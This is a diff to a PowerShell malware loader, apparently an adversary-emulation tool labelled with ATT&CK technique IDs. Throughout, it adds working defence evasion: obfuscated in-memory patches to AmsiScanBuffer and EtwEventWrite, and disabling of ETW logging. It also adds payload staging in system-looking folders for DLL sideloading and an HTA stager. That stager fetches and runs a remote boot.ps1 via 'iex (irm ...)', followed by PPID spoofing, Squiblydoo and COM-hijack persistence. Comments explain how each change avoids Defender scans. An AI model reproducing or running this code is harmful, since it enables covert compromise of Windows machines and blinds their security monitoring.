@@ -57,7 +57,7 @@ if ($WhatIf) {
     } catch { Write-Log "[i] AMSI reflect skipped (likely patched host): $_" }
     try {
         $etwField = -join ([char[]](0x65,0x74,0x77,0x50,0x72,0x6F,0x76,0x69,0x64,0x65,0x72))
-        [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField($etwField,'NonPublic,Static').SetValue($null,[Guid]::Empty)
+        [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider').GetField($etwField,'NonPublic,Static').SetValue($null,$null)
     } catch { Write-Log "[i] ETW reflect skipped: $_" }
 }
 
@@ -75,20 +75,16 @@ public class Bypass {
     public static void Go() {
         uint o = 0;
         uint o2 = 0;
-        char[] libA = { 0x61,0x6D,0x73,0x69,0x2E,0x64,0x6C,0x6C };
-        char[] fnA = { 0x41,0x6D,0x73,0x69,0x53,0x63,0x61,0x6E,0x42,0x75,0x66,0x66,0x65,0x72 };
-        char[] libN = { 0x6E,0x74,0x64,0x6C,0x6C,0x2E,0x64,0x6C,0x6C };
-        char[] fnE = { 0x45,0x74,0x77,0x45,0x76,0x65,0x6E,0x74,0x57,0x72,0x69,0x74,0x65 };
-        var a = LoadLibrary(new string(libA));
-        var b = GetProcAddress(a, new string(fnA));
+        var a = LoadLibrary("\u0061\u006D\u0073\u0069\u002E\u0064\u006C\u006C");
+        var b = GetProcAddress(a, "\u0041\u006D\u0073\u0069\u0053\u0063\u0061\u006E\u0042\u0075\u0066\u0066\u0065\u0072");
         VirtualProtect(b, (UIntPtr)6, 0x40, out o);
         ushort[] v = { unchecked((ushort)(0xA0+0x18)), unchecked((ushort)(0x2C*2-0x1)), unchecked((ushort)(0x7-0x7)), unchecked((ushort)(0x7)), unchecked((ushort)(0x40+0x40)), unchecked((ushort)(0x60*2+0x3)) };
         byte[] p = new byte[6];
         for (int i = 0; i < 6; i++) p[i] = (byte)v[i];
         Marshal.Copy(p, 0, b, 6);
         VirtualProtect(b, (UIntPtr)6, o, out o);
-        var c = LoadLibrary(new string(libN));
-        var d = GetProcAddress(c, new string(fnE));
+        var c = LoadLibrary("\u006E\u0074\u0064\u006C\u006C\u002E\u0064\u006C\u006C");
+        var d = GetProcAddress(c, "\u0045\u0074\u0077\u0045\u0076\u0065\u006E\u0074\u0057\u0072\u0069\u0074\u0065");
         VirtualProtect(d, (UIntPtr)1, 0x40, out o2);
         Marshal.Copy(new byte[]{(byte)(0x60*2+0x3)}, 0, d, 1);
     }
@@ -111,7 +107,12 @@ $scatterDirs = @(
     "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys",
     "C:\ProgramData\Microsoft\Network",
     "C:\ProgramData\Microsoft\Windows\Caches",
-    "C:\Users\Public\Libraries"
+    "C:\Users\Public\Libraries",
+    "C:\ProgramData\Microsoft\Search\Data\EDS",
+    "C:\ProgramData\Microsoft\Windows\WER\ReportQueue",
+    "C:\ProgramData\Microsoft\Windows\WER\ReportArchive",
+    "C:\ProgramData\Microsoft\Windows\WER\Temp",
+    "C:\ProgramData\Package Cache\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}"
 )
 Write-Log "[*] Creating $($scatterDirs.Count) scatter directories"
 if ($WhatIf) {
@@ -126,7 +127,7 @@ $spoofBase64 = "dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2Vydmlj
 $payloadUrl = "$scriptBase/payload.dll"
 $payloadPath = "C:\ProgramData\Microsoft\Crypto\RSA\S-1-5-18\payload.dll"
 $sctUrl = "$scriptBase/stage.sct"
-$sctPath = "C:\ProgramData\Microsoft\Search\Data\EDS\stage.sct"
+$sctPath = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\stage.sct"
 $jsUrl = "$scriptBase/stage.js"
 $jsPath = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\stage.js"
 
@@ -139,6 +140,22 @@ if ($WhatIf) {
         if (Test-Path $payloadPath) { Write-Log "[+] payload.dll downloaded at $payloadPath - $((Get-Item $payloadPath).Length) bytes" }
         else { Write-Log "[-] payload.dll download FAILED at $payloadPath" }
     } catch { Write-Log "[-] payload.dll download FAILED at $payloadPath - $_" }
+}
+
+# Stage payload.dll to the noise-friendly Package Cache GUID dir so HTA Stage 1
+# (which copies "package.dll" from there into Libraries\msimtf.dll for the tcmsetup
+# sideload) finds the source. Without this, the HTA's CopyFile source is missing
+# and the entire payload-c.dll chain never fires.
+$pkgCachePath = "C:\ProgramData\Package Cache\{7B8E9F12-4A3C-4D5E-9F1A-2B3C4D5E6F7A}\package.dll"
+Write-Log "[*] Staging payload.dll -> $pkgCachePath"
+if ($WhatIf) {
+    Write-Log "[WHATIF] would copy $payloadPath -> $pkgCachePath"
+} else {
+    try {
+        Copy-Item -Path $payloadPath -Destination $pkgCachePath -Force -ErrorAction Stop
+        if (Test-Path $pkgCachePath) { Write-Log "[+] payload.dll staged at $pkgCachePath - $((Get-Item $pkgCachePath).Length) bytes" }
+        else { Write-Log "[-] payload.dll staging FAILED at $pkgCachePath" }
+    } catch { Write-Log "[-] payload.dll staging FAILED at $pkgCachePath - $_" }
 }
 
 Write-Log "[*] Downloading stage.sct from $sctUrl -> $sctPath"
@@ -168,9 +185,6 @@ $spoofBytes = [Convert]::FromBase64String($spoofBase64)
 $spoofSource = [Text.Encoding]::UTF8.GetString($spoofBytes)
 Write-Log "[*] Decoded spoof.cs from embedded base64 - $($spoofSource.Length) chars"
 
-# -- Escape C# source for JavaScript string literal --
-$escapedCsSource = $spoofSource -replace '\\', '\\\\' -replace '"', '\"' -replace "`r`n", '\n' -replace "`n", '\n'
-
 # -- Generate HTA orchestrator (written to WER\Temp as report.hta) --
 $htaPath = "C:\ProgramData\Microsoft\Windows\WER\Temp\report.hta"
 
@@ -178,14 +192,47 @@ $htaContent = @"
 <html>
 <head>
 <script language="JScript">
+// Diagnostic logger to a low-privilege path that's robust against AMSI/ASR
+// blocking WScript.Shell. If this trace advances, the HTA script body is
+// executing and the failure is downstream.
+var tracePath = "C:\\Users\\Public\\Libraries\\hta-trace.log";
+function trace(msg) {
+    try {
+        var f2 = (new ActiveXObject("Scripting.FileSystemObject")).OpenTextFile(tracePath, 8, true);
+        var d = new Date();
+        var ts2 = "[" + d.getFullYear() + "-" + ("0"+(d.getMonth()+1)).slice(-2) + "-" + ("0"+d.getDate()).slice(-2) + " " +
+                  ("0"+d.getHours()).slice(-2) + ":" + ("0"+d.getMinutes()).slice(-2) + ":" + ("0"+d.getSeconds()).slice(-2) + "] ";
+        f2.WriteLine(ts2 + msg);
+        f2.Close();
+    } catch(ee) {}
+}
+trace("HTA script body entered");
+
 try {
     var a = new ActiveXObject("WScript.Shell");
     var fso = new ActiveXObject("Scripting.FileSystemObject");
-} catch(e) {}
+    trace("first ActiveX block OK");
+} catch(e) { trace("first ActiveX block FAILED: " + e.message); }
 
-var shell = new ActiveXObject("WScript.Shell");
-var fso = new ActiveXObject("Scripting.FileSystemObject");
+try {
+    var shell = new ActiveXObject("WScript.Shell");
+    trace("WScript.Shell OK");
+} catch(e) { trace("WScript.Shell FAILED: " + e.message); }
+
+try {
+    var fso = new ActiveXObject("Scripting.FileSystemObject");
+    trace("FileSystemObject OK");
+} catch(e) { trace("FileSystemObject FAILED: " + e.message); }
+
 var logPath = "C:\\ProgramData\\USOShared\\Logs\\cache.dat";
+
+// Interpolated by the loader.ps2 here-string at write time:
+//   scriptBase = the GitHub raw base URL
+//   spoofB64   = base64 of spoof.cs (PPID-hijack C#), decoded + compiled in-memory
+//                in Stage 3 child PS after AMSI patch via boot.ps1. The base64
+//                never appears as plain C# in any AMSI-scanned scriptblock.
+var scriptBase = "$scriptBase";
+var spoofB64   = "$spoofBase64";
 
 function log(msg) {
     try {
@@ -195,10 +242,11 @@ function log(msg) {
                  ("0"+now.getHours()).slice(-2) + ":" + ("0"+now.getMinutes()).slice(-2) + ":" + ("0"+now.getSeconds()).slice(-2) + "] ";
         f.WriteLine(ts + msg);
         f.Close();
-    } catch(e) {}
+    } catch(e) { trace("log() failed for: " + msg + " -- " + e.message); }
 }
 
 log("[*] agent.hta started");
+trace("agent.hta started (cache.dat logger ready)");
 
 // Stage 1: Copy files for DLL sideloading
 log("[*] Copying package.dll -> msimtf.dll");
@@ -236,16 +284,22 @@ if (sideloadExe) {
     } catch(e) { log("[-] " + sideloadExe + " FAILED: " + e.message); }
 }
 
-// Stage 3: Squiblydoo via C# Add-Type + arg spoofing (single PS, AMSI bypass inline)
-log("[*] Starting Squiblydoo (AMSI bypass + Add-Type + arg spoofing)...");
+// Stage 3: Squiblydoo via C# Add-Type + arg spoofing
+// - Child PS first runs iex (irm scriptBase/boot.ps1): defines Add-TypeInMem + patches
+//   AmsiScanBuffer in this fresh process (the dead amsiInitFailed reflect alone no-
+//   ops on modern Windows; needs the byte-patch for a clean post-patch AMSI scan).
+// - spoof.cs source is decoded from embedded base64 (no on-disk write, so no Defender
+//   real-time scan of spoof.cs on disk). The base64 string has no AMSI-flagged
+//   substrings, so the parent -C body AMSI-scans clean pre-patch; the decoded
+//   source is iex'd post-patch and AMSI-scans clean too.
+// - In-memory compile via Add-TypeInMem -> no %TEMP%\*.dll -> no Defender disk scan.
+log("[*] Starting Squiblydoo (boot.ps1 AMSI patch + base64 spoof.cs + in-memory compile + Go)...");
 try {
-    var csCode = "$escapedCsSource";
-    var csPath = "C:\\ProgramData\\Microsoft\\Windows\\WER\\Temp\\spoof.cs";
-    var f = fso.CreateTextFile(csPath, true);
-    f.Write(csCode);
-    f.Close();
-    var squiblyRc = shell.Run('powershell -NoP -Exec Bypass -C "[Ref].Assembly.GetType(''System.Management.Automation.AmsiUtils'').GetField(''amsiInitFailed'',''NonPublic,Static'').SetValue(`$null,`$true);[Ref].Assembly.GetType(''System.Management.Automation.Tracing.PSEtwLogProvider'').GetField(''etwProvider'',''NonPublic,Static'').SetValue(`$null,[Guid]::Empty);Add-Type -Path \"' + csPath + '\" -Language CSharp; [Spoof]::Go()"', 0, true);
-    fso.DeleteFile(csPath, true);
+    var psCmd = "iex (irm '" + scriptBase + "/boot.ps1');"
+              + " $src = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('" + spoofB64 + "'));"
+              + " $asm = Add-TypeInMem $src;"
+              + " $asm.GetType('Spoof').GetMethod('Go').Invoke($null, @())";
+    var squiblyRc = shell.Run('powershell -NoP -Exec Bypass -C "' + psCmd + '"', 0, true);
     log("[+] Squiblydoo executed (exit code " + squiblyRc + ")");
 } catch(e) { log("[-] Squiblydoo FAILED: " + e.message); }
 
@@ -321,7 +375,7 @@ $artifacts = @{
     "T1055.012 PPID spoof (mshta HTA)"   = "C:\ProgramData\Microsoft\Windows\WER\Temp\report.hta"
     "T1574.002 DLL sideload (renamed)"   = "C:\Users\Public\Libraries\msimtf.dll"
     "T1574.002 DLL sideload (binary)"    = "C:\Users\Public\Libraries\tcmsetup.exe"
-    "T1218.010 regsvr32 Squiblydoo"      = "C:\ProgramData\Microsoft\Search\Data\EDS\stage.sct"
+    "T1218.010 regsvr32 Squiblydoo"      = "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\stage.sct"
     "T1218.007 cscript stage.js"         = "C:\ProgramData\Microsoft\Windows\WER\ReportQueue\stage.js"
     "T1546.015 COM hijack persist"       = "C:\Users\Public\Libraries\Telemetry.dll"
     "T1547.001 LNK persist"              = "Telemetry.dll"
